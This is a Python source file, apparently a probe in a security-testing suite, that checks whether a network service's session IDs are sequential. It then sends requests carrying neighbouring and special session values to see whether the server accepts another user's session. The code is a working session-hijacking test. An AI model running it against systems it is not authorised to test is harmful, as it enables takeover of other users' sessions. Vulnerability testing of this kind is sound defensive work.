"""
PROBE 05 — Session ID Hijacking / Guessing
Hypothesis: Session IDs are u32. If sequential or predictable, they may be
guessable. Also test using someone else's session ID.
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import time
from vulnerabilities.lib.probe import make_handle, connect_cleartext, send_recv, report

def run():
    # Step 1: Collect session IDs from multiple connections
    sessions = []
    for _ in range(5):
        sock, session, username = connect_cleartext()
        sessions.append(session)
        send_recv(sock, {'request_type': 2, 'session': session, 'request_handle': make_handle()})
        sock.close()
        time.sleep(0.5)

    print(f"Session IDs observed: {sessions}")
    diffs = [sessions[i+1] - sessions[i] for i in range(len(sessions)-1)]
    print(f"Deltas between sessions: {diffs}")
    sequential = all(d > 0 and d < 1000 for d in diffs)
    print(f"Appears sequential: {sequential}")

    # Step 2: Try slightly-off session IDs
    sock, real_session, _ = connect_cleartext()
    print(f"\nReal session: {real_session}")
    hijack_succeeded = False
    for delta in [-1, 1, -2, 2, 100, -100]:
        fake_session = (real_session + delta) & 0xFFFFFFFF
        response = send_recv(sock, {
            'request_type': 3,
            'session': fake_session,
            'request_handle': make_handle()
        })
        accepted = response and response.get(b'response_type') == 24
        print(f"  Session {real_session}+{delta:+d} ({fake_session}): {response} {'<-- ACCEPTED!' if accepted else ''}")
        if accepted:
            hijack_succeeded = True
        time.sleep(0.2)

    # Step 3: Special session values
    for special in [0, 1, 2**32 - 1]:
        response = send_recv(sock, {
            'request_type': 3, 'session': special, 'request_handle': make_handle()
        })
        accepted = response and response.get(b'response_type') == 24
        print(f"  Session={special}: {response} {'<-- ACCEPTED!' if accepted else ''}")
        if accepted:
            hijack_succeeded = True
        time.sleep(0.2)

    sock.close()

    vulnerable = sequential or hijack_succeeded
    report(
        'PROBE 05 — Session ID Hijacking / Guessing',
        "Session IDs are sequential/predictable or server accepts wrong session IDs",
        {'sessions': sessions, 'sequential': sequential, 'hijack_succeeded': hijack_succeeded},
        vulnerable,
        evidence=f"Sequential: {sequential}, Hijack succeeded: {hijack_succeeded}"
    )

if __name__ == '__main__':
    run()
